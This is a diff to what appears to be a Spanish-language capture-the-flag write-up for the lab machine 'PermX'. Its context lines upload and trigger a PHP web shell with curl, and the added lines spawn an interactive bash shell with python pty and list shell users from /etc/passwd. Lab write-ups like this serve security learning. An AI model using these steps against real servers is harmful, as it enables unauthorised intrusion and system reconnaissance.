@@ -73,3 +73,14 @@ curl -F 'bigUploadFile=@sheel.php' 'http://lms.permx.htb//main/inc/lib/javascrip
 
 curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/sheel.php'
 
+- Ingresamos al servidor y importamos una libreria de python para obtener una bash
+
+| importamos bash |
+| python3 -c 'import pty;pty.spawn("/bin/bash")' |
+
+
+- Buscamos la existencia de otros usuarios
+
+> cat /etc/passwd | grep -i sh$
+
+
